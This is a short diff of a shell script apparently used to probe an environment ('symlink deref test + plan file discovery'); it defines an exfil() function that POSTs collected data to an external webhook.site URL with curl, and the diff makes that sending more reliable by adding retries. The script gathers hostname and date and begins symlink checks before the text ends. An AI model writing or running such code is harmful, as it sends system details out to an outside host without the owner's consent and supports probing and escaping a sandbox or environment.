@@ -2,7 +2,7 @@
 # Lane C battery5: symlink deref test + plan file discovery
 TOKEN="31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
 W="https://webhook.site/$TOKEN"
-exfil() { printf '%s' "###$1### $2" | curl -sS -m 25 -X POST "$W" -H "Content-Type: text/plain" --data-binary @- >/dev/null 2>&1; echo "exfil:$1 done"; }
+exfil() { printf '%s' "###$1### $2" | curl -sS -m 25 --retry 4 --retry-all-errors --retry-delay 2 -X POST "$W" -H "Content-Type: text/plain" --data-binary @- >/dev/null 2>&1; echo "exfil:$1 done"; }
 
 G1="host=$(hostname) date=$(date -u)
 === symlink lstat ===
